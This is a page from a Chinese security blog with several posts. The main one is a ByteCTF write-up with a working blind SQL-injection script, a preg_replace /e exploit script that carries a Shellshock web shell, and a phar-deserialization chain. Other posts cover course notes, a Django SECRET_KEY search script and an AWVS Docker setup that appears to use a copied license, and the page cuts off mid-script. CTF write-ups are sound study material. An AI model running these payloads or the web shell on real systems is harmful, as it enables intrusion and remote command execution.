<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https://www.ccreater.top/page/5/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/bytectfwp/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/bytectfwp/">bytectf wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
<pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){
        $title = addslashes($_POST[&#39;title&#39;]);
        $content = addslashes($_POST[&#39;content&#39;]);
        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);
    }</code></pre>
<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
<p>sql盲注判断脚本:</p>
<pre><code class="python">import requests
from bs4 import BeautifulSoup
anti_disturb_key=&#39;cjb_ccreater_s_test&#39;
PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;
check_article_id=20
def check(check_title):
    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)
    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]
    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text
    if title[:len(anti_disturb_key)]!=anti_disturb_key :
        return &#39;disturb&#39;
    elif content!=&#39;success&#39;+check_title:
        return &#39;false&#39;
    else :
        return &#39;success&#39;



def make_write(title,info):
    data={
        &#39;title&#39;:title,
        &#39;content&#39;:info
    }
    url=&#39;http://112.125.24.134:9999/writing.php&#39;
    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    if res.status_code==200:
        return True
    else :
        return False

def get_newest_id():
    url=&#39;http://112.125.24.134:9999/index.php&#39;
    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]
    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]
    return int(newest_id)

def sql_inject(sql):
    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;
    info=&#39;success&#39;+title
    if make_write(title,info):
        #编辑id=newest_id的文章来读取$raw[&#39;title&#39;]
        newest_id=get_newest_id()
        url=&#39;http://112.125.24.134:9999/edit.php&#39;
        data={
            &#39;title&#39;:title,
            &#39;content&#39;:info,
            &#39;id&#39;:newest_id
        }
        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)
        #判断盲注结果
        result=check(title)
        if result==&#39;success&#39;:
            return True
        elif result==&#39;disturb&#39;:
            print(&quot;受到干扰,重新执行&quot;)
            return sql_inject(sql)
        else :
            return False
    else :
        print(&#39;程序执行错误,请保持结果&#39;)
        eval(input(&#39;执行命令:&#39;))

#demo 
#sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;
sql=&#39;&#39;&#39;
(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess 
&#39;&#39;&#39;
### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67
#猜information_schema表名
#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b
result=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;

index=len(result)
while 1:
    index+=1
    temp=sql.replace(&#39;index&#39;,str(index))
    for i in range(20):
        print(&quot;猜测第&quot;+str(index)+&quot;位为:&quot;+str(i))
        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):
            result+=hex(i)[2:]
            break
    print(result)
    res=&#39;&#39;
    for i in range(0,len(result),2):
        res+=chr(int(result[i:i+2],16))
    print(res)

</code></pre>
<p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>绕过正则过滤</p>
<p>拿到vip账号:wulax,密码:1,网址:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p>
<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
<p>命令执行利用脚本:</p>
<pre><code class="python">import requests

url=&quot;http://112.126.101.16:9999&quot;
arc_id=&quot;11&quot;
session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;
text=&#39;&#39;&#39;
&lt;?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
   $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;; 
    $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;
    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;; 

   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != &quot;&quot;) return $output; 
   else return &quot;No output, or not vuln.&quot;; 
} 
echo shellshock($_REQUEST[&quot;cmd&quot;]); 
?&gt;
&#39;&#39;&#39;
def edit():
    data={
        &quot;title&quot;:&quot;bbb&quot;,
        &quot;content&quot;:&quot;b&quot;,
        &quot;id&quot;:arc_id
    }
    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
def exec(s):
    data={
        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,
        &quot;regex&quot;:&quot;1&quot;,
        &quot;id&quot;:arc_id,
        &quot;find&quot;:&quot;b/e\x00&quot;,
        &quot;cmd&quot;:&quot;ls -al&quot;,
        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;
    }
    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
    edit()
    return result
while 1:
    print(exec(input()).text)</code></pre>
<p>emmmm..到这里就不会做了.到头了.</p>
<p>后来发现有个antsystem()</p>
<p>vardump(antsystem(‘/readfile’));</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
<p>代码审计发现</p>
<p>在config.php下</p>
<pre><code class="php">class File{
    public $filename;
    public $filepath;
    public $checker;
    function __construct($filename, $filepath)
    {
        $this-&gt;filepath = $filepath;
        $this-&gt;filename = $filename;
    }
    function __destruct()
    {
        if (isset($this-&gt;checker)){
            $this-&gt;checker-&gt;upload_file();
        }
    }
    public function view_detail(){

        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){
            die(&quot;nonono~&quot;);
        }
        $mine = mime_content_type($this-&gt;filepath);
        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);
        $res[&#39;mine&#39;] = $mine;
        $res[&#39;store_path&#39;] = $store_path;
        return $res;

    }
}</code></pre>
<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
<p>最后在view.php处找到调用view_detail的地方</p>
<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
<p>所以我们可以可以试着删除它</p>
<p>构造pop链:</p>
<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
<p>我觉得这才是这一题最骚的地方:</p>
<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
<p>然后手动pk :D</p>
<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/bytectfwp/">https://www.ccreater.top/1970/01/01/bytectfwp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/bytectfwp/" data-id="ckmn5756u004zs1ni1wsfg0wv" data-title="bytectf wp" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-coursera-杜克大学 程序设计与 Web 入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/">coursera-杜克大学 程序设计与 Web 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="coursera-杜克大学-程序设计与-Web-入门"><a href="#coursera-杜克大学-程序设计与-Web-入门" class="headerlink" title="coursera-杜克大学 程序设计与 Web 入门"></a>coursera-杜克大学 程序设计与 Web 入门</h1><h2 id="在coursera上学习的感受"><a href="#在coursera上学习的感受" class="headerlink" title="在coursera上学习的感受"></a>在coursera上学习的感受</h2><p>我觉得最大的优点是:教学和练习同时进行,极大的帮助了我快速掌握知识,这是我最喜欢的一点.但是对于中国境内的视频 加载有点难受,不过可以通过修改hosts来改善.</p>
<p>虽然这种教学方式我很喜欢,但是由于我的课程选择不太适合我自己(太基础了),导致我其实没学到啥,但是我还是硬着头皮看完了(闲得无聊?),选择适合自己的课程真的特别重要</p>
<h2 id="提问问题的注意事项"><a href="#提问问题的注意事项" class="headerlink" title="提问问题的注意事项"></a>提问问题的注意事项</h2><p><strong>详细</strong>,<strong>清楚</strong>的描述自己遇到的问题,及自己尝试解决问题的结果</p>
<h2 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h2><pre><code class="css">.classname{
    preperty:value;
}

#ID{
    preperty:value;
}
tagname {
    preperty:value;
}
;or
tag1 tag2 {
    preperty:value;
}
;这个会修改tag1下的tag2</code></pre>
<h2 id="css资料"><a href="#css资料" class="headerlink" title="css资料"></a>css资料</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p>
<h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p>
<p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p>
<p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p>
<h2 id="用编程解决问题的七步骤"><a href="#用编程解决问题的七步骤" class="headerlink" title="用编程解决问题的七步骤"></a>用编程解决问题的七步骤</h2><ol>
<li>Work example by hand.<br>清晰的认识要解决的问题,并手动尝试解决</li>
<li>Write down what you did.<br>写下自己解决问题的过程(只针对这个具体的例子),不要忽略我们理所当然的东西,计算机不会这么想,我们要尽可能的详细,精确的记录我们解决问题的步骤</li>
<li>Find patterns.<br>将过程抽象成解决这个问题的一般性步骤,注意重复的步骤(变为循环语句),注意判断(变为条件语句)</li>
<li>Check by hand.<br>用具体的例子来检验抽象的步骤是否能解决问题</li>
<li>Translate to code. </li>
<li>Run test cases. </li>
<li>Debug failed test cases.<br>一般可以把问题分为:步骤问题(如没考虑某些特殊情况)和将步骤转为程序时(如函数用错)的问题</li>
</ol>
<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p>
<p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);
for(var pixel of img.values())
{//pixel是img.values()的引用
    pixel.setRed(255);
    pixel.setGreen(255);
    pixel.setBlue(0);
}
print(img);</code></pre>
<h3 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);
var context = canvas.getContext(&#39;2d&#39;);
#init
context.clearRect(0, 0, canvas.width, canvas.height);
#clear canvas
context.font = &quot;30px Arial&quot;;
context.fillText(&quot;Hello World&quot;, 10, 50);
#draw a text


context.fillStyle = &quot;red&quot;;
context.fillRect(10, 10, 150, 80);
#draw rectangle</code></pre>
<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><p>当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标</p>
<p>但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量</p>
<h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p>
<h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p>
<h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p>
<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>onclick,onchage,oninput</p>
<h2 id="给自己的建议"><a href="#给自己的建议" class="headerlink" title="给自己的建议"></a>给自己的建议</h2><blockquote>
<p>合格的程序员不应该浪费很多时间用于程序调试,他们应该一开始就不要把故障引入.</p>
<p>—-迪杰斯特拉</p>
</blockquote>
<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p>
<p>发现bug-&gt;明确目的(了解bug发生的原因及解决方法)-&gt;收集信息-&gt;(多次)提出猜想(where,why)(要具有可测试性)-&gt;验证-&gt;解决</p>
<h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/coursera-杜克大学">https://www.ccreater.top/1970/01/01/coursera-杜克大学</a> 程序设计与 Web 入门/](<a href="https://www.ccreater.top/1970/01/01/coursera-杜克大学">https://www.ccreater.top/1970/01/01/coursera-杜克大学</a> 程序设计与 Web 入门/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" data-id="ckmn5756v0051s1niaucs3u2l" data-title="coursera-杜克大学 程序设计与 Web 入门" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-django快速查找配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
<p>看到p牛一句很容易,人就傻掉了</p>
<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p>
<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
<p>代码写的不太好,自己改改用吧////</p>
<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
from django.template import engines
from django.contrib.auth import login as auth_login, get_user_model, authenticate
from django.contrib.auth.views import LoginView, logout_then_login
from django.contrib.auth.decorators import login_required
from django.views import generic
from django import template

import django
from django import template
register = template.Library()

@register.filter
def get_dict(obj,way=&quot;&quot;,depth=0):
    if depth&gt;11:
        return 
    objdir=dir(obj)
    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
    result=&quot;&quot;

    for i in objdir:            
        try :
            if &#39;_&#39; == i[0]:
                continue
            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
        except TypeError:
            pass

    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
        print(way)
        return result+way+&quot;\n&quot;
    return result</code></pre>
<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
<p>dir()和<code>__dict__</code>的区别</p>
<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
<p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
<p>所以以后查看对象的所有属性一定要用dir()</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/django快速查找配置/">https://www.ccreater.top/1970/01/01/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" data-id="ckmn5756x0054s1niarerci51" data-title="django快速查找配置" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-docker部署awvs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/docker%E9%83%A8%E7%BD%B2awvs/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/docker%E9%83%A8%E7%BD%B2awvs/">docker部署awvs</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="docker部署awvs"><a href="#docker部署awvs" class="headerlink" title="docker部署awvs"></a>docker部署awvs</h1><p>链接: <a href="https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw</a> 提取码: buti </p>
<p>将百度云下载内容放到awvs文件夹下</p>
<p>Dockerfile</p>
<pre><code class="dockerfile">FROM ubuntu:16.04
COPY awvs /awvs
EXPOSE 3443
RUN /awvs/setenv.sh&amp;&amp; echo -e &quot;\nyes\nubuntu\nccreater@163.com\nccr,123456\nccr,123456\n&quot;|/awvs/acunetix_13.0.200217097_x64_.sh &amp;&amp; \
cp /awvs/wvsc /home/acunetix/.acunetix/v_200217097/scanner/wvsc &amp;&amp;\
cp /awvs/license_info.json  /home/acunetix/.acunetix/data/license/license_info.json &amp;&amp;\
echo -e &#39;#!/bin/bash\nsu acunetix &amp;&amp; (nohup bash ~/.acunetix/start.sh &amp;) &amp;&amp; exit&#39;&gt; /etc/rc.local
</code></pre>
<p>setenv.sh</p>
<pre><code class="shell">#!/bin/bash

shared_obj_deps=(libpango-1.0.so.0 libXext.so.6 libpthread.so.0 libXi.so.6 libgobject-2.0.so.0 libgtk-3.so.0 libdl.so.2 libgdk_pixbuf-2.0.so.0 libX11.so.6 libuuid.so.1 librt.so.1 libexpat.so.1 libglib-2.0.so.0 libXdamage.so.1 libatk-1.0.so.0 libm.so.6 libatspi.so.0 libcups.so.2 libgio-2.0.so.0 libXfixes.so.3 libXrender.so.1 libxcb.so.1 libsmime3.so libcairo.so.2 libXcomposite.so.1 libgdk-3.so.0 libpangocairo-1.0.so.0 libgcc_s.so.1 libX11-xcb.so.1 libdbus-1.so.3 libnss3.so libXrandr.so.2 libnspr4.so libXcursor.so.1 libnssutil3.so libXss.so.1 libasound.so.2 libatk-bridge-2.0.so.0 libc.so.6 libXtst.so.6)
read -d &#39;&#39; source &lt;&lt;EOF
